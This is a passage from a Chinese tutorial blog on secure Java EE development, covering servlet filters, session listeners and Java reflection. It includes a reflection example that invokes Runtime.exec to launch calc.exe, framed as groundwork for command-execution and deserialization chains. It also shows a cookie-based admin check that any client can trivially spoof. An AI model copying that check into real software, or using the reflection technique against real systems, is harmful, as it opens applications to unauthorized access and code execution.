class="line">        &#125;else&#123;</span><br><span class="line">            System.out.println(&quot;存在XSS攻击&quot;);</span><br><span class="line">            //继续拦截</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们输入<code>/test?code=&lt;script&gt;</code>时，返回结果：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/6.png" alt="6"></p>
<h2 id="cookie验证"><a href="#cookie验证" class="headerlink" title="cookie验证"></a>cookie验证</h2><h3 id="AdminServlet"><a href="#AdminServlet" class="headerlink" title="AdminServlet"></a>AdminServlet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.example.filterdemo1.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/admin&quot;)</span><br><span class="line">public class AdminServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;欢迎进入管理员页面&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AdminFilter"><a href="#AdminFilter" class="headerlink" title="AdminFilter"></a>AdminFilter</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package com.example.filterdemo1.filter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.Cookie;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebFilter(&quot;/admin&quot;)</span><br><span class="line">public class AdminFileter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        System.out.println(&quot;admin身份检测开启&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        System.out.println(&quot;admin身份检测销毁&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;admin身份检测进行&quot;);</span><br><span class="line">        //检测Cookie过滤</span><br><span class="line">        HttpServletRequest request= (HttpServletRequest) servletRequest;</span><br><span class="line">        Cookie[] cookies=request.getCookies(); //接收cookies给cookies变量</span><br><span class="line">        //对Cookie进行遍历获取</span><br><span class="line">        for(Cookie c:cookies)&#123; //因为cookie可能有多个，所以用数组</span><br><span class="line">            String cName = c.getName();//获取cookie名</span><br><span class="line">            String cValue = c.getValue();//获取cookie值</span><br><span class="line">            System.out.println(cName);</span><br><span class="line">            System.out.println(cValue);</span><br><span class="line">            if(cName.contains(&quot;user&quot;) &amp;&amp; cValue.contains(&quot;admin&quot;))&#123;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse); //放行</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                System.out.println(&quot;非管理员访问&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当访问<code>/admin</code>时，返回结果：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/7.png" alt="7"></p>
<h1 id="Listen"><a href="#Listen" class="headerlink" title="Listen"></a>Listen</h1><h2 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h2><p>监听器</p>
<p>-监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件</p>
<p>-监听域对象的属性发生修改的事件</p>
<p>-监听在事件发生前、发生后做一些必要的处理</p>
<p>监听器的用途</p>
<ul>
<li><p>统计在线人数和用户</p>
</li>
<li><p>系统启动的时候加载初始化信息</p>
</li>
<li><p>统计网站的访问量</p>
</li>
</ul>
<p>监听器安全场景：代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</p>
<h2 id="监听session的创建和销毁"><a href="#监听session的创建和销毁" class="headerlink" title="监听session的创建和销毁"></a>监听session的创建和销毁</h2><h3 id="CSession"><a href="#CSession" class="headerlink" title="CSession"></a>CSession</h3><p>实现功能创建session</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.example.listendemo1.Servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/cs&quot;)</span><br><span class="line">public class CSession extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;  //get请求的时候调用</span><br><span class="line">        System.out.println(&quot;Servlet里面创建Session&quot;);</span><br><span class="line">        req.getSession();        //创建Session</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概意思就是在访问&#x2F;cs时创建session</p>
<h3 id="DSession"><a href="#DSession" class="headerlink" title="DSession"></a>DSession</h3><p>实现功能销毁session</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.example.listendemo1.Servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/ds&quot;)</span><br><span class="line">public class DSession extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Servlet里面销毁Session&quot;);</span><br><span class="line">        req.getSession().invalidate();    //销毁Session</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概意思就是在访问&#x2F;ds时销毁session</p>
<h3 id="ListenSession"><a href="#ListenSession" class="headerlink" title="ListenSession"></a>ListenSession</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package com.example.listendemo1.listener;</span><br><span class="line"></span><br><span class="line">import javax.servlet.annotation.WebListener;</span><br><span class="line">import javax.servlet.http.HttpSessionEvent;</span><br><span class="line">import javax.servlet.http.HttpSessionListener;</span><br><span class="line"></span><br><span class="line">@WebListener //用@WebListener注解就实现监听</span><br><span class="line">public class ListenSession implements HttpSessionListener &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void sessionCreated(HttpSessionEvent se) &#123;</span><br><span class="line">        //监听检测有Session创建就会执行这里</span><br><span class="line">        System.out.println(&quot;监听器监听到了session创建&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void sessionDestroyed(HttpSessionEvent se) &#123;</span><br><span class="line">        //监听检测有Session销毁就会执行这里</span><br><span class="line">        System.out.println(&quot;监听器监听到了session销毁&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为访问网站就会创建一个session，所以我用&#x2F;ds，&#x2F;cs，&#x2F;ds的顺序访问网站，结果如图：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/8.png" alt="8"></p>
<h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><h2 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h2><p>反射机制就是运行时获得程序每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性</p>
<p>安全应用场景：</p>
<p>构造利用链，触发命令执行</p>
<p>反序列化中的利用链构造</p>
<p>动态获取或执行任意类中的属性或方法</p>
<p>动态代理的底层原理是反射技术</p>
<p>rmi反序列化也涉及到反射操作</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/9.png" alt="9"></p>
<h2 id="User-java"><a href="#User-java" class="headerlink" title="User.java"></a>User.java</h2><p>先写一个文件等会调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package com.example.reflectdemo1;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    //成员变量</span><br><span class="line">    public String name=&quot;znskiw&quot;;</span><br><span class="line">    public int age = 18;</span><br><span class="line">    private String gender=&quot;man&quot;;</span><br><span class="line">    protected String job=&quot;stu&quot;;</span><br><span class="line"></span><br><span class="line">    //构造方法</span><br><span class="line">    public User()&#123;</span><br><span class="line">        //System.out.println(&quot;无参数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(String name)&#123;</span><br><span class="line">        System.out.println(&quot;我的名字:&quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private User(String name,int age)&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //成员方法</span><br><span class="line">    public void userinfo(String name,int age,String gender,String job)&#123;</span><br><span class="line">        this.job=job;</span><br><span class="line">        this.age=age;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.gender=gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void users(String name,String gender)&#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.gender=gender;</span><br><span class="line">        System.out.println(&quot;users成员方法：&quot;+name);</span><br><span class="line">        System.out.println(&quot;users成员方法：&quot;+gender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Class对象类获取"><a href="#Class对象类获取" class="headerlink" title="Class对象类获取"></a>Class对象类获取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.example.reflectdemo1;</span><br><span class="line"></span><br><span class="line">public class GetClass &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        //1、根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span><br><span class="line">        Class aClass = Class.forName(&quot;com.example.reflectdemo1.User&quot;);</span><br><span class="line">        System.out.println(aClass);</span><br><span class="line"></span><br><span class="line">        //2、根据类名：类名.class</span><br><span class="line">        Class userClass = User.class;</span><br><span class="line">        System.out.println(userClass);</span><br><span class="line"></span><br><span class="line">        //3、根据对象：对象.getClass()</span><br><span class="line">        User user= new User();</span><br><span class="line">        Class aClass1 = user.getClass();</span><br><span class="line">        System.out.println(aClass1);</span><br><span class="line"></span><br><span class="line">        //4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span><br><span class="line">        ClassLoader clsload=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class aClass2 = clsload.loadClass(&quot;com.example.reflectdemo1.User&quot;);</span><br><span class="line">        System.out.println(aClass2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>四选一即可，一般第一种使用最多，第四种最少</p>
<p>运行结果：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/10.png" alt="10"></p>
<h2 id="Field成员变量类获取"><a href="#Field成员变量类获取" class="headerlink" title="Field成员变量类获取"></a>Field成员变量类获取</h2><p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/11.png" alt="11"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.example.reflectdemo1;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class GetFiled &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class aClass = Class.forName(&quot;com.example.reflectdemo1.User&quot;);</span><br><span class="line"></span><br><span class="line">        //获取公共的成员变量</span><br><span class="line">        Field[] fields = aClass.getFields();</span><br><span class="line">        for(Field fd:fields)&#123;</span><br><span class="line">           System.out.println(&quot;获取公共的成员变量:&quot;+fd);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取所有的成员变量</span><br><span class="line">        Field[] fields1 = aClass.getDeclaredFields();</span><br><span class="line">        for(Field fd:fields1)&#123;</span><br><span class="line">            System.out.println(&quot;获取所有的成员变量:&quot;+fd);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取单个的公共成员变量</span><br><span class="line">        Field name = aClass.getField(&quot;name&quot;);</span><br><span class="line">        System.out.println(&quot;获取单个的公共成员变量:&quot;+name);</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取单个的成员变量</span><br><span class="line">        Field gender = aClass.getDeclaredField(&quot;gender&quot;);</span><br><span class="line">        System.out.println(&quot;获取单个的成员变量:&quot;+gender);</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取公共的成员变量age的值</span><br><span class="line">        User u = new User();</span><br><span class="line">        Field field=aClass.getField(&quot;age&quot;);</span><br><span class="line"></span><br><span class="line">        //取值</span><br><span class="line">        Object a=field.get(u);</span><br><span class="line">        System.out.println(&quot;获取公共的成员变量age的值:&quot;+a);</span><br><span class="line"></span><br><span class="line">        //赋值</span><br><span class="line">        field.set(u,19);</span><br><span class="line">        Object aa=field.get(u);</span><br><span class="line">        System.out.println(&quot;age重新赋值后：&quot;+aa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/12.png" alt="12"></p>
<h2 id="Constructor构造方法类获取"><a href="#Constructor构造方法类获取" class="headerlink" title="Constructor构造方法类获取"></a>Constructor构造方法类获取</h2><p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/13.png" alt="13"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package com.example.reflectdemo1;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">public class GetConstructor &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        Class aClass = Class.forName(&quot;com.example.reflectdemo1.User&quot;);</span><br><span class="line">        //获取公共的构造方法</span><br><span class="line">        Constructor[] constructors = aClass.getConstructors();</span><br><span class="line">        for (Constructor con:constructors)&#123;</span><br><span class="line">            System.out.println(&quot;获取公共的构造方法:&quot;+con);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取所有的构造方法</span><br><span class="line">        Constructor[] constructors1 = aClass.getDeclaredConstructors();</span><br><span class="line">        for (Constructor con:constructors1)&#123;</span><br><span class="line">            System.out.println(&quot;获取所有的构造方法:&quot;+con);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取单个的公共的构造方法</span><br><span class="line">        Constructor constructor = aClass.getConstructor(String.class);</span><br><span class="line">        System.out.println(&quot;获取单个的公共的构造方法:&quot;+constructor);</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取单个的构造方法</span><br><span class="line">        Constructor con1 = aClass.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">        System.out.println(&quot;获取单个的公共的构造方法:&quot;+con1);</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //对构造方法进行操作(两个参数string，int)</span><br><span class="line">        Constructor con2=aClass.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">        //临时开启对私有的访问</span><br><span class="line">        con2.setAccessible(true);</span><br><span class="line">        User uu=(User) con2.newInstance(&quot;对构造方法进行操作:&quot;+&quot;ylt&quot;,19);</span><br><span class="line">        //System.out.println(uu);</span><br><span class="line"></span><br><span class="line">        //对构造方法进行执行(1个参数strin)</span><br><span class="line">        Constructor con3=aClass.getConstructor(String.class);</span><br><span class="line">        con3.newInstance(&quot;对构造方法进行执行:&quot;+&quot;ylt1234&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/14.png" alt="14"></p>
<h2 id="Method成员方法类获取"><a href="#Method成员方法类获取" class="headerlink" title="Method成员方法类获取"></a>Method成员方法类获取</h2><p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/15.png" alt="15"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">package com.example.reflectdemo1;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class GetMethod &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class aClass = Class.forName(&quot;com.example.reflectdemo1.User&quot;);</span><br><span class="line">        //获取包括继承的公共成员方法</span><br><span class="line">        Method[] methods = aClass.getMethods();</span><br><span class="line">        for(Method me:methods)&#123;</span><br><span class="line">            System.out.println(&quot;获取包括继承的公共成员方法:&quot;+me);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取不包括继承的所有成员方法</span><br><span class="line">        Method[] methods1 = aClass.getDeclaredMethods();</span><br><span class="line">        for(Method me:methods1)&#123;</span><br><span class="line">            System.out.println(&quot;获取不包括继承的所有成员方法:&quot;+me);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">        //获取单个的成员方法</span><br><span class="line">        Method users = aClass.getDeclaredMethod(&quot;users&quot;, String.class,String.class);</span><br><span class="line">        System.out.println(&quot;获取单个的成员方法:&quot;+users);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //对成员方法进行执行</span><br><span class="line">        User u = new User();</span><br><span class="line">        Method users1 = aClass.getDeclaredMethod(&quot;users&quot;, String.class,String.class);</span><br><span class="line">        users1.invoke(u,&quot;ylt1234&quot;,&quot;1234&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/16.png" alt="16"></p>
<p>这里我用鼠标标蓝的就是继承来的，即程序本身自带的成员方法，比如我们使用的String就有自带的</p>
<h2 id="反射应用"><a href="#反射应用" class="headerlink" title="反射应用"></a>反射应用</h2><p>反射实现命令执行</p>
<p>一般的命令执行，我们需要调用JDK自带的rt.jar包里的<code>Runtime.getRuntime().exec()</code>命令来执行，我们现在可以通过反射，不使用这个命令，自己去包里调用。</p>
<p>我们通过ctrl+点击getRuntime，可以追踪到它的tRuntime.java，得知他是成员方法：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/17.png" alt="17"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package com.example.reflectdemo1;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class GetRunExec &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        //原生调用 JDK自带的rt.jar</span><br><span class="line">        //Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        //如果是第三方的jar包呢</span><br><span class="line">        Class aClass = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        //获取exec成员方法</span><br><span class="line">        Method exec = aClass.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        //获取getRuntime成员方法</span><br><span class="line">        Method getRuntimeMethod = aClass.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">        //执行</span><br><span class="line">        Object runtime = getRuntimeMethod.invoke(aClass);</span><br><span class="line">        exec.invoke(runtime, &quot;calc.exe&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们遇到第三方的包，没有函数直接使用，我们就可以用这种方法调用</p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h2><p>1、序列化与反序列化</p>
<p>序列化：将内存中的对象压缩成字节流</p>
